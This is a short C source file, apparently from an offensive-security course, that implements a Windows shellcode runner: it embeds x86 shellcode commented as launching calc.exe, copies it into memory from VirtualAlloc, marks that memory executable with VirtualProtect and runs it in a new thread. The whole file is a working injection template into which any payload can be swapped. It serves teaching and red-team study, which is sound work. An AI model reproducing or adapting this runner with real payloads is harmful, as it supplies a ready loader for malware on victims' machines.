/*

 Shellcode runner author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Our WinExec PopCalc shellcode
unsigned char payload[] = 
"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e"
"\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43"
"\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b"
"\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75"
"\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61"
"\xc3\x68\x98\xfe\x8a\x0e\xff\x55\x04\x89\x45\x10\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x14\x31\xc0"
"\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x54\x5b\x31\xc0\x50\x53\xff\x55\x10\x31\xc0\x50\x6a\xff"
"\xff\x55\x14";


unsigned int payload_len = 178;

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
  DWORD oldprotect = 0;

	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}